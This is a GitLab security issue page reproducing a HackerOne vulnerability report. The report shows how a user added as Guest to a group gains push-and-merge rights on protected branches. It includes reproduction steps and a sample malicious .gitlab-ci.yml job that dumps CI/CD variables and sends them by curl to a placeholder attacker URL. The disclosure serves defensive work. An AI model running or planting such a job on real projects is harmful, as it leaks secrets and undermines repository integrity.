=== Content from gitlab.com_4a4da89a_20250114_232213.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Unauthorized member can gain `Allowed to push and merge` access and affect integrity of protected branches

⚠ **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2104540](https://hackerone.com/reports/2104540)** by `theluci` on 2023-08-09, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

Hello,

I found that when a group is granted **Allowed to push and merge** access to the protected branch of a project.

It is not checked whether the member gaining **Allowed to push and merge** access is atleast a *Developer* in the granted group. But only whether the member has a max role of *Developer* in the project or not.

#### Background

Gitlab provides a PREMIUM/ULTIMATE feature to grant *specific groups* or *specific users* [**Allowed to merge** and **Allowed to push and merge** access on protected branches](https://docs.gitlab.com/ee/user/project/protected_branches.html#add-protection-to-existing-branches).

[![2aug-1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/86b07bb7fb29778e32ed64b9b788a6133f46a908/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f66313564323838372d336465312d343037622d613766322d3934376561616634373136382f326175672d312e706e67)

When a specific user is being granted **Allowed to push and merge** access.

Only users with **atleast** *Developer* role are shown and can be granted the above access.

[![2aug-2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/f10c6f0209183ef3b922b388c79254baf1d8e84b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f61663338386262302d363961312d343437652d623362302d6335336435383330353161652f326175672d322e706e67)

[![2aug-5.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/75d57149a22a80a844dddc1247f257fa9dd19816/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f38336636393237392d333663352d346132322d616330322d6134653638623439353934642f326175672d352e706e67)

Similarly, when a group is granted **Allowed to push and merge** access to the protected branch of a project.

**Only the *members of the group* with *atleast Developer* role are granted the above access.**

#### Vulnerability

When a group is granted **Allowed to push and merge** access to the protected branch of a project.

It is not checked whether the user gaining **Allowed to push and merge** access is atleast a *Developer* in the granted group.

It is only checked whether the user,

a) Is a member of the *granted group*

b) Has a maximum role of *Developer* in the project

Due to this the following Attack is possible,

1. `victim` is the *Owner* of `victim-project`.
2. `attacker` is a *Developer* of `victim-project`.
3. `victim` goes to `https://gitlab.com/<victim-group>/<victim-project>/-/project_members` and adds `granted-group` as *Developer*.
4. `victim` goes to `https://gitlab.com/<victim-group>/<victim-project>/-/settings/repository`, **Expand Protected branches** and grants **Allowed to push and merge** access to `granted-group`.

`victim` expects that only the members of the `granted-group` with *atleast Developer* role are granted the above access.

5. `attacker` is successful in joining the `granted-group` as a ***Guest***.

**As `attacker` and `victim` are already working on `victim-project` together, it will be quite easy and most possible for `attacker` to join `granted-group` as a *Guest*.**

6. `attacker` automatically gains **Allowed to push and merge** access on the protected branch.

`victim` has no idea that `attacker` has gained **Allowed to push and merge** access on the protected branch.

7. `attacker` can use this access to,

   a) Affect the integrity of the protected branch

   b) Upload a malicious .gitlab-ci.yml file to leak the project and parent group’s CI/CD variables

#### Steps to reproduce

1. `victim` creates a group `victim-group` and activates *Ultimate trial*.
2. `victim` creates a project `victim-project` inside `victim-group`.
3. `victim` goes to `https://gitlab.com/<victim-group>/<victim-project>/-/project_members` and adds `attacker` as *Developer*.
4. `victim` creates a group `granted-group`.
5. `victim` goes to `granted-group` membership page `https://gitlab.com/groups/<granted-group>/-/group_members` and adds `victim-member` as *Developer*.
6. `victim` goes to `victim-project` membership page `https://gitlab.com/<victim-group>/<victim-project>/-/project_members` and invites `granted-group` as *Developer*.
7. `victim` goes to `https://gitlab.com/<victim-group>/<victim-project>/-/settings/repository`, **Expand Protected branches** and grants **Allowed to push and merge** access to `granted-group`.

`victim` expects that only the members of the `granted-group` with *atleast Developer* role are granted the above access.

8. `victim` goes to `granted-group` membership page `https://gitlab.com/groups/<granted-group>/-/group_members` and adds `attacker` as *Guest*.

**As `attacker` and `victim` are already working on `victim-project` together, it will be quite easy and most possible for `attacker` to join `granted-group` as a *Guest*.**

9. `attacker` automatically gains **Allowed to push and merge** access on the protected branch.

`victim` has no idea that `attacker` has gained **Allowed to push and merge** access on the protected branch.

10. `attacker` can use this access to affect the **Integrity** of the protected branch,

* `attacker` can create a new file using the **`+`** symbol.
* `attacker` may choose to edit an existing file or delete an existing file.

11. `attacker` can also use this access to Upload a *malicious .gitlab-ci.yml file* with the following content,

```
job_name:
 script:
   - export > test.txt
   - curl -X POST --data "$(cat test.txt)" attacker-controlled-url
```

To leak the project and parent group’s CI/CD variables affecting **Confidentiality**.

(While testing this make sure `victim` has added some CI/CD variables in `victim-project` and `victim-group`)

#### POC

[9aug-2.mp4](https://user-content.gitlab-static.net/3b311dced41410f4d4a8ca751826c97ba0e15b4b/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f30626261633531372d653265642d346631612d623630302d6539316430623138343766642f396175672d322e6d7034 "Download '9aug-2.mp4'")

#### Output of checks

This bug happens on GitLab.com (Probably on instance too).

#### Impact

Unauthorized member can gain `Allowed to push and merge` access on protected branches and use this access to,

1. Affect the **Integrity** of the protected branches.
2. Upload a malicious .gitlab-ci.yml file to leak the project and parent group’s CI/CD variables affecting **Confidentiality**.

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [2aug-1.png](https://h1.sec.gitlab.net/a/f15d2887-3de1-407b-a7f2-947eaaf47168/2aug-1.png)
* [2aug-2.png](https://h1.sec.gitlab.net/a/af388bb0-69a1-447e-b3b0-c53d583051ae/2aug-2.png)
* [2aug-5.png](https://h1.sec.gitlab.net/a/83f69279-36c5-4a22-ac02-a4e68b49594d/2aug-5.png)
* [9aug-2.mp4](https://h1.sec.gitlab.net/a/0bbac517-e2ed-4f1a-b600-e91d0b1847fd/9aug-2.mp4)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


